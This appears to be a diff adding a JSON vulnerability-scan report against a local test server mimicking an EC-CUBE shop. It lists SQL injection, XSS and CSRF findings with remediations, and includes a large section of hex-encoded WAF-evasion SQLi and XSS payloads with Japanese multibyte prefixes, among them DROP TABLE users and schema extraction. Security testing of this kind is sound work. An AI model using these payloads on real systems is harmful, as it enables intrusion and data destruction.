@@ -1,0 +1,360 @@
+{
+  "metadata": {
+    "tool": "recon-navi",
+    "version": "0.4.0",
+    "target": "http://[REDACTED-TARGET]",
+    "target_id": "127_0_0_1_8888",
+    "scan_id": "20260404_191028_7738c10c",
+    "method": "GET",
+    "scan_timestamp": "2026-04-04T19:10:28.034482+00:00",
+    "model": "llama3.1:8b-instruct-q5_K_M",
+    "encoding_focus": "Japanese infrastructure (Shift-JIS / EUC-JP / ISO-2022-JP)"
+  },
+  "summary": {
+    "status_code": 200,
+    "detected_encoding": "utf-8-sig",
+    "is_vulnerable": true,
+    "finding_count": 14,
+    "severity_breakdown": {
+      "critical": 9,
+      "high": 1,
+      "medium": 2,
+      "low": 2,
+      "info": 0
+    },
+    "oob_confirmed": 0,
+    "error": null
+  },
+  "cvss_4_0": {
+    "0": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "1": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "2": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "3": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "4": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "5": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "6": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "7": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "8": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N",
+      "score": 9.3
+    },
+    "9": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:H/SI:H/SA:N",
+      "score": 6.6
+    },
+    "10": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+      "score": 4.4
+    },
+    "11": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+      "score": 4.4
+    },
+    "12": {
+      "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+      "score": 0.1
+    },
+    "13": {
+      "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+      "score": 0.0
+    }
+  },
+  "tech_stack": [
+    "Apache HTTP Server",
+    "PHP"
+  ],
+  "server_info": "BaseHTTP/0.6 Python/3.13.12, Apache/2.4.51 (EC-CUBE)",
+  "encoding_analysis": {
+    "detected_encoding": "utf-8-sig",
+    "vulnerabilities": [
+      "declared_encoding_decode_failure: declared encoding 'shift_jis' failed to decode response body — server is sending a different encoding than advertised"
+    ],
+    "injection_surfaces": [
+      "HTML form without accept-charset attribute — server accepts multibyte-encoded input without restricting charset"
+    ]
+  },
+  "security_headers": {
+    "missing": [
+      {
+        "header": "strict-transport-security",
+        "detail": "Missing HSTS — site is vulnerable to SSL-stripping attacks"
+      },
+      {
+        "header": "x-content-type-options",
+        "detail": "Missing X-Content-Type-Options: nosniff — MIME-sniffing attacks possible"
+      },
+      {
+        "header": "x-frame-options",
+        "detail": "Missing X-Frame-Options — clickjacking may be possible"
+      },
+      {
+        "header": "content-security-policy",
+        "detail": "Missing Content-Security-Policy — XSS mitigation absent"
+      },
+      {
+        "header": "permissions-policy",
+        "detail": "Missing Permissions-Policy — browser feature access uncontrolled"
+      },
+      {
+        "header": "referrer-policy",
+        "detail": "Missing Referrer-Policy — sensitive URL data may leak to third parties"
+      }
+    ],
+    "present": [],
+    "info": [
+      "Version disclosure via 'server': BaseHTTP/0.6 Python/3.13.12, Apache/2.4.51 (EC-CUBE)",
+      "Version disclosure via 'x-powered-by': PHP/7.4.33"
+    ]
+  },
+  "logic_analysis": {
+    "keigo_analysis": {
+      "keigo_level": "kenjogo",
+      "rejection_type": "logic",
+      "apology_present": true,
+      "support_reference": false,
+      "finding_worthy": true
+    },
+    "privilege_cues": [
+      "'管理者' — administrator label",
+      "'管理画面' — admin panel UI label",
+      "'一般ユーザー' — regular user label (role distinction present)"
+    ],
+    "idor_encoding_hits": []
+  },
+  "oob": {
+    "pending": [],
+    "confirmed": []
+  },
+  "findings": [
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: '",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: '",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: \"",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: \"",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: ' OR '1'='1",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched 'データベースエラー' in response to payload: ' OR '1'='1",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/search",
+      "evidence": "Matched 'データベースエラー' in response to payload: '",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/search",
+      "evidence": "Matched 'データベースエラー' in response to payload: \"",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "sqli",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/search",
+      "evidence": "Matched 'データベースエラー' in response to payload: ' OR '1'='1",
+      "encoding": "utf-8",
+      "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
+    },
+    {
+      "vuln_type": "xss",
+      "severity": "high",
+      "confidence": "confirmed",
+      "description": "Active probe confirmed XSS via xss_marker payload on POST http://[REDACTED-TARGET]/login",
+      "evidence": "Matched '<z>xsstest9831</z>' in response to payload: <z>xsstest9831</z>",
+      "encoding": "utf-8",
+      "remediation": "HTML-encode all output. Implement a strict Content-Security-Policy."
+    },
+    {
+      "vuln_type": "csrf",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "description": "POST form at 'http://[REDACTED-TARGET]/login' has no CSRF token input. State-changing requests can be forged from any origin.",
+      "evidence": "Form action=http://[REDACTED-TARGET]/login  inputs=[user_id, password]",
+      "encoding": "",
+      "remediation": "Add a per-session, unpredictable CSRF token to every state-changing form. Verify the token server-side on each submission."
+    },
+    {
+      "vuln_type": "csrf",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "description": "POST form at 'http://[REDACTED-TARGET]/search' has no CSRF token input. State-changing requests can be forged from any origin.",
+      "evidence": "Form action=http://[REDACTED-TARGET]/search  inputs=[id]",
+      "encoding": "",
+      "remediation": "Add a per-session, unpredictable CSRF token to every state-changing form. Verify the token server-side on each submission."
+    },
+    {
+      "vuln_type": "encoding",
+      "severity": "low",
+      "confidence": "confirmed",
+      "description": "declared_encoding_decode_failure: declared encoding 'shift_jis' failed to decode response body — server is sending a different encoding than advertised",
+      "evidence": "",
+      "encoding": "utf-8-sig",
+      "remediation": "Ensure server charset declaration is accurate and consistent."
+    },
+    {
+      "vuln_type": "logic",
+      "severity": "low",
+      "confidence": "possible",
+      "description": "Business logic rejection detected (kenjogo Keigo register). Soft rejection — may be bypassable via session/parameter manipulation.",
+      "evidence": "Keigo=kenjogo  rejection=logic  apology=True  cues=['管理者' — administrator label; '管理画面' — admin panel UI label; '一般ユーザー' — regular user label (role distinction present)]  cookies=none",
+      "encoding": "",
+      "remediation": "Test admin paths with current session cookie. Attempt role parameter manipulation (e.g. role=admin, is_admin=1). Review access control implementation for horizontal/vertical IDOR."
+    }
+  ],
+  "waf_evasion_payloads": {
+    "sqli_1_shift_jis_so_prefix": "835c27204f5220313d31202d2d",
+    "sqli_1_shift_jis_ya_prefix": "838427204f5220313d31202d2d",
+    "sqli_1_euc_jp_omote_prefix": "c9bd27204f5220313d31202d2d",
+    "sqli_1_shift_jis": "27204f5220313d31202d2d",
+    "sqli_1_euc-jp": "27204f5220313d31202d2d",
+    "sqli_1_iso-2022-jp": "27204f5220313d31202d2d",
+    "sqli_1_halfwidth_kana_sjis": "b127204f5220313d31202d2d",
+    "sqli_1_shift_jis_urlencoded": "253237253230253446253532253230253331253344253331253230253244253244",
+    "sqli_2_shift_jis_so_prefix": "835c27204f52202731273d2731",
+    "sqli_2_shift_jis_ya_prefix": "838427204f52202731273d2731",
+    "sqli_2_euc_jp_omote_prefix": "c9bd27204f52202731273d2731",
+    "sqli_2_shift_jis": "27204f52202731273d2731",
+    "sqli_2_euc-jp": "27204f52202731273d2731",
+    "sqli_2_iso-2022-jp": "27204f52202731273d2731",
+    "sqli_2_halfwidth_kana_sjis": "b127204f52202731273d2731",
+    "sqli_2_shift_jis_urlencoded": "253237253230253446253532253230253237253331253237253344253237253331",
+    "sqli_3_shift_jis_so_prefix": "835c2720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_shift_jis_ya_prefix": "83842720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_euc_jp_omote_prefix": "c9bd2720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_shift_jis": "2720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_euc-jp": "2720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_iso-2022-jp": "2720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_halfwidth_kana_sjis": "b12720554e494f4e2053454c454354204e554c4c2d2d",
+    "sqli_3_shift_jis_urlencoded": "253237253230253535253445253439253446253445253230253533253435253443253435253433253534253230253445253535253443253443253244253244",
+    "sqli_4_shift_jis_so_prefix": "835c273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_shift_jis_ya_prefix": "8384273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_euc_jp_omote_prefix": "c9bd273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_shift_jis": "273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_euc-jp": "273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_iso-2022-jp": "273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_halfwidth_kana_sjis": "b1273b2044524f50205441424c452075736572732d2d",
+    "sqli_4_shift_jis_urlencoded": "253237253342253230253434253532253446253530253230253534253431253432253443253435253230253735253733253635253732253733253244253244",
+    "sqli_5_shift_jis_so_prefix": "835c2720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_shift_jis_ya_prefix": "83842720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_euc_jp_omote_prefix": "c9bd2720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_shift_jis": "2720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_euc-jp": "2720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_iso-2022-jp": "2720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_halfwidth_kana_sjis": "b12720414e4420313d434f4e5645525428696e742c2853454c45435420544f502031207461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c657329292d2d",
+    "sqli_5_shift_jis_urlencoded": "253237253230253431253445253434253230253331253344253433253446253445253536253435253532253534253238253639253645253734253243253238253533253435253443253435253433253534253230253534253446253530253230253331253230253734253631253632253643253635253546253645253631253644253635253230253436253532253446253444253230253639253645253636253646253732253644253631253734253639253646253645253546253733253633253638253635253644253631253245253734253631253632253643253635253733253239253239253244253244",
+    "xss_1_shift_jis_so_prefix": "835c3c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_shift_jis_ya_prefix": "83843c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_euc_jp_omote_prefix": "c9bd3c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_shift_jis": "3c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_euc-jp": "3c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_iso-2022-jp": "3c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_halfwidth_kana_sjis": "b13c7363726970743e616c6572742831293c2f7363726970743e",
+    "xss_1_shift_jis_urlencoded": "253343253733253633253732253639253730253734253345253631253643253635253732253734253238253331253239253343253246253733253633253732253639253730253734253345",
+    "xss_2_shift_jis_so_prefix": "835c223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_shift_jis_ya_prefix": "8384223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_euc_jp_omote_prefix": "c9bd223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_shift_jis": "223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_euc-jp": "223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_iso-2022-jp": "223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_halfwidth_kana_sjis": "b1223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "xss_2_shift_jis_urlencoded": "253232253345253343253639253644253637253230253733253732253633253344253738253230253646253645253635253732253732253646253732253344253631253643253635253732253734253238253331253239253345",
+    "xss_3_shift_jis_so_prefix": "835c273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_shift_jis_ya_prefix": "8384273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_euc_jp_omote_prefix": "c9bd273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_shift_jis": "273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_euc-jp": "273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_iso-2022-jp": "273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_halfwidth_kana_sjis": "b1273b616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329292f2f",
+    "xss_3_shift_jis_urlencoded": "253237253342253631253643253635253732253734253238253533253734253732253639253645253637253245253636253732253646253644253433253638253631253732253433253646253634253635253238253338253338253243253338253333253243253338253333253239253239253246253246",
+    "encoding_confusion_shift_jis_テスト": "836583588367",
+    "encoding_confusion_euc-jp_テスト": "a5c6a5b9a5c8",
+    "encoding_confusion_shift_jis_エラー": "83478389815b",
+    "encoding_confusion_euc-jp_エラー": "a5a8a5e9a1bc",
+    "encoding_confusion_shift_jis_管理者": "8ac7979d8ed2",
+    "encoding_confusion_euc-jp_管理者": "b4c9cdfdbcd4",
+    "null_byte_sjis": "00"
+  },
+  "raw_headers": {
+    "server": "BaseHTTP/0.6 Python/3.13.12, Apache/2.4.51 (EC-CUBE)",
+    "date": "Sat, 04 Apr 2026 19:12:41 GMT",
+    "content-type": "text/html; charset=Shift_JIS",
+    "content-length": "944",
+    "x-powered-by": "PHP/7.4.33"
+  }
+}
